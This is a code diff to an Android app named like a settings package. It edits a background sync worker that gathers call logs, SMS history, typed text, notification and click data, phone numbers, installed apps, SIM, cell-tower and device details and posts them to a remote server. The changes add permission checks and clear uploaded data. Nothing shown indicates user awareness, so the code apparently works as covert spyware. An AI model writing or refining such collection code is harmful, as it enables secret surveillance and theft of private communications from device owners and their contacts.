@@ -1,5 +1,6 @@
 package com.example.settings;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.ClipData;
 import android.content.Context;
@@ -36,6 +37,7 @@ import static com.example.settings.MainActivity.geturl;
 import static com.example.settings.MainActivity.setupWorkManager;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
+import static com.example.settings.Utils.checkpermission;
 import static com.example.settings.Utils.getDateTime;
 import static com.example.settings.Utils.newUrlData;
 
@@ -76,8 +78,10 @@ public class SyncData extends Worker {
         OtherNotificationData=mSharedpref.getOtherNotificationData();
         ClickedData=mSharedpref.getClickedData();
         OtherClickedData=mSharedpref.getOtherClickedData();
-        Utils.readCallLogs(context,mSharedpref);
-        Utils.readSmsHistory((Activity) context,mSharedpref);
+        if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
+            Utils.readCallLogs(context, mSharedpref);
+        }
+        Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
         Utils.checkServices(context,mSharedpref);
         try {
@@ -95,12 +99,15 @@ public class SyncData extends Worker {
         if(isConnectedToNetwork(context)){
             if (!Name.isEmpty()) {
                 int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
-                if (mSharedpref.getPrevPhoneNumbersLisSize() != numberlistsize) {
+                int prev=mSharedpref.getPrevPhoneNumbersLisSize();
+                if (prev!= numberlistsize) {
                     Phonenumberdetails = mSharedpref.getPhoneNumbers();
                     mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
                     mSharedpref.commit();
                 }
-                if (mSharedpref.getPrevPhoneAppdetailsListSize() != mSharedpref.getPhoneAppdetailsListSize()) {
+                int applistsize= mSharedpref.getPhoneAppdetailsListSize();
+                int prevAppListSize=mSharedpref.getPrevPhoneAppdetailsListSize();
+                if ( prevAppListSize!=applistsize) {
                     Phoneappdetails = mSharedpref.getPhoneAppdetails();
                     mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
                     mSharedpref.commit();
@@ -130,6 +137,8 @@ public class SyncData extends Worker {
                                     mSharedpref.setCallHistory("");
                                     mSharedpref.setPhoneLockDetails("");
                                     mSharedpref.setBatteryPercnt("");
+                                    mSharedpref.setSmsHistory("");
+                                    mSharedpref.setServiceStatus("");
                                     mSharedpref.commit();
                                    try {
                                        geturl();
@@ -172,8 +181,8 @@ public class SyncData extends Worker {
                             parmas.put("OtherClickedData", OtherClickedData);
                             parmas.put("CallHistory",mSharedpref.getCallHistory());
                             parmas.put("SmsHistory",mSharedpref.getSmsHistory());
-                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                             parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
+                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
@@ -230,7 +239,7 @@ public class SyncData extends Worker {
                             parmas.put("action", "addItem");
                             parmas.put("Name", Name);
                             parmas.put("DaysTime", DaysTime);
-                            parmas.put("TextWritten", TextWritten);
+                            parmas.put("TextWritten", "Everything is empty");
                             parmas.put("OutgoingNumbers", OutgoingNumbers);
                             parmas.put("RecievedNumbers", RecievedNumbers);
                             parmas.put("MissedCallNumbers", MissedCallNumbers);
